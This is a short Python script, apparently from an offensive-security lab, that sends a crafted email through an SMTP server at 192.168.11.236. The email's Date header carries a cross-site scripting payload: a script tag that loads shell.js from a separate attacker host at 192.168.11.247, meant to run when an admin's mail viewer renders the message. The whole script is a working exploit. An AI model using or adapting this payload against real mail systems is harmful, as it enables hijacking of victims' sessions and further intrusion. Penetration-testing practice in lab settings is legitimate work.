#!/usr/bin/python
import smtplib
from smtplib import SMTPException

sender = 'victims@offsec.local'
receivers = 'admin@offsec.local'

message = """From: victim@offsec.local"
To: admin@offsec.local
Date: <script src="http://192.168.11.247/shell.js"></script>
MIME-Version: 1.0
Content-type: text/html
Subject: Urgent 

you have been pwnd by Win Sam

"""

try:
   smtpObj = smtplib.SMTP('192.168.11.236')
   smtpObj.sendmail(sender, receivers, message)         
   print "Successfully sent email"
except SMTPException:
   print "Error: unable to send email"
